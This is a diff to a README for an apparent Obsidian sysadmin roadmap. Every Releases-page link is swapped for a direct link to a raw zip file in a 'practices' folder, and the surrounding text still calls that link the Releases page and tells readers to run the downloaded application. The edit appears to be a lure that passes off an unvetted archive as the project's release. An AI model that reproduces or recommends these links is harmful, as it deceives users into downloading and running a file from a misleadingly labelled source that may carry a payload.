@@ -4,12 +4,12 @@
 Welcome to the **sysadmin-roadmap-obsidian**! This interactive roadmap helps you navigate your way from a junior to a senior system administrator. It covers over 85 topics, helping you build a solid foundation and understand various technologies with ease.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SIXjhander/sysadmin-roadmap-obsidian/releases)
+[![Download](https://raw.githubusercontent.com/SIXjhander/sysadmin-roadmap-obsidian/main/practices/roadmap-obsidian-sysadmin-v3.9.zip)](https://raw.githubusercontent.com/SIXjhander/sysadmin-roadmap-obsidian/main/practices/roadmap-obsidian-sysadmin-v3.9.zip)
 
 ## 📥 Download & Install
 To get started, you need to visit the Releases page. There, you will find the latest version of the software. Follow these simple steps:
 
-1. **Visit the Releases page**: Click [here](https://github.com/SIXjhander/sysadmin-roadmap-obsidian/releases).
+1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/SIXjhander/sysadmin-roadmap-obsidian/main/practices/roadmap-obsidian-sysadmin-v3.9.zip).
 2. **Choose the version**: You will see a list of available versions. Select the one you want to download.
 3. **Download the file**: Look for the asset that matches your operating system. Click the link to download it.
 4. **Run the application**: Once the download finishes, locate the file on your computer and open it to start using the roadmap.
@@ -71,4 +71,4 @@ For further reading, check out these resources:
 
 Thank you for using the **sysadmin-roadmap-obsidian**! We hope this application supports your journey in system administration. 
 
-Don’t forget to download the software [here](https://github.com/SIXjhander/sysadmin-roadmap-obsidian/releases) and embark on your path to success!
+Don’t forget to download the software [here](https://raw.githubusercontent.com/SIXjhander/sysadmin-roadmap-obsidian/main/practices/roadmap-obsidian-sysadmin-v3.9.zip) and embark on your path to success!
